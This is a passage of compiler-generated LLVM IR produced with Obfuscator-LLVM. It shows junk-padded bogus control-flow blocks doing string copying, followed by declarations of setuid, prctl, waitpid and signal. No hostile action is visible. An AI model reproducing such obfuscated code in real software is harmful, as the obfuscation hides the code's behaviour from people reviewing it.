  %_25 = shl i32 %695, 1
  %_26 = shl i32 %695, 1
  %_27 = shl i32 %695, 1
  %_28 = shl i32 %695, 1
  %696 = add i32 %695, 1
  store i32 %696, i32* %14, align 4
  br label %originalBB22

originalBB33alteredBB:                            ; preds = %originalBB33, %299
  %697 = load i8*, i8** %15, align 8
  %698 = getelementptr inbounds i8, i8* %697, i64 1
  store i8* %698, i8** %16, align 8
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %323
  %699 = load i8*, i8** %16, align 8
  %700 = load i8, i8* %699, align 1
  %701 = zext i8 %700 to i32
  %702 = icmp ne i32 %701, 0
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %344
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %362
  %703 = load i8*, i8** %16, align 8
  %704 = getelementptr inbounds i8, i8* %703, i32 1
  store i8* %704, i8** %16, align 8
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %381
  %705 = load i8*, i8** %16, align 8
  %706 = load i8, i8* %705, align 1
  %707 = zext i8 %706 to i32
  %708 = icmp eq i32 %707, 0
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %432
  %709 = load i8*, i8** %15, align 8
  %710 = load i8*, i8** %15, align 8
  %711 = call i64 @strlen(i8* %710) #9
  %_54 = sub i64 0, %711
  %gen55 = add i64 %_54, 1
  %_56 = shl i64 %711, 1
  %_57 = sub i64 0, %711
  %gen58 = add i64 %_57, 1
  %_59 = shl i64 %711, 1
  %712 = sub i64 %711, 1
  %713 = getelementptr inbounds i8, i8* %709, i64 %712
  store i8 0, i8* %713, align 1
  br label %originalBB53

originalBB63alteredBB:                            ; preds = %originalBB63, %461
  %714 = load i8*, i8** %15, align 8
  %715 = load i8, i8* %714, align 1
  %716 = zext i8 %715 to i32
  %717 = icmp ne i32 %716, 0
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %487
  %718 = load i8*, i8** %15, align 8
  store i8 0, i8* %718, align 1
  %719 = load i8*, i8** %15, align 8
  %720 = getelementptr inbounds i8, i8* %719, i32 1
  store i8* %720, i8** %15, align 8
  %721 = load i8*, i8** %17, align 8
  store i8* %721, i8** %18, align 8
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %508
  %722 = load i8*, i8** %18, align 8
  %723 = load i8, i8* %722, align 1
  %724 = icmp ne i8 %723, 0
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %542
  %725 = load i8*, i8** %21, align 8
  %726 = icmp ne i8* %725, null
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %561
  %727 = load i8*, i8** %21, align 8
  %728 = load i8, i8* %727, align 1
  %729 = zext i8 %728 to i32
  %730 = icmp ne i32 %729, 10
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %582
  %731 = load i8*, i8** %21, align 8
  %732 = call i64 @strlen(i8* %731) #9
  %_84 = sub i64 %732, 1
  %gen85 = mul i64 %_84, 1
  %_86 = sub i64 %732, 1
  %gen87 = mul i64 %_86, 1
  %733 = add i64 %732, 1
  %734 = call noalias i8* @malloc(i64 %733) #5
  %735 = load i32, i32* %20, align 4
  %736 = sext i32 %735 to i64
  %737 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %736
  store i8* %734, i8** %737, align 8
  %738 = load i32, i32* %20, align 4
  %739 = sext i32 %738 to i64
  %740 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %739
  %741 = load i8*, i8** %740, align 8
  %742 = load i8*, i8** %21, align 8
  %743 = call i64 @strlen(i8* %742) #9
  %_88 = shl i64 %743, 1
  %_89 = shl i64 %743, 1
  %_90 = shl i64 %743, 1
  %744 = add i64 %743, 1
  call void @llvm.memset.p0i8.i64(i8* %741, i8 0, i64 %744, i32 1, i1 false)
  %745 = load i32, i32* %20, align 4
  %746 = sext i32 %745 to i64
  %747 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %746
  %748 = load i8*, i8** %747, align 8
  %749 = load i8*, i8** %21, align 8
  %750 = call i8* @strcpy(i8* %748, i8* %749) #5
  %751 = load i32, i32* %20, align 4
  %_91 = sub i32 %751, 1
  %gen92 = mul i32 %_91, 1
  %_93 = sub i32 %751, 1
  %gen94 = mul i32 %_93, 1
  %_95 = shl i32 %751, 1
  %_96 = sub i32 0, %751
  %gen97 = add i32 %_96, 1
  %_98 = sub i32 0, %751
  %gen99 = add i32 %_98, 1
  %752 = add nsw i32 %751, 1
  store i32 %752, i32* %20, align 4
  br label %originalBB83

originalBB103alteredBB:                           ; preds = %originalBB103, %628
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %659
  br label %originalBB107
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146520450}
!2 = !{i32 -2146519322}
!3 = !{i32 -2146518631}
!4 = !{i32 -2146517882}
!5 = !{i32 -2146516943}
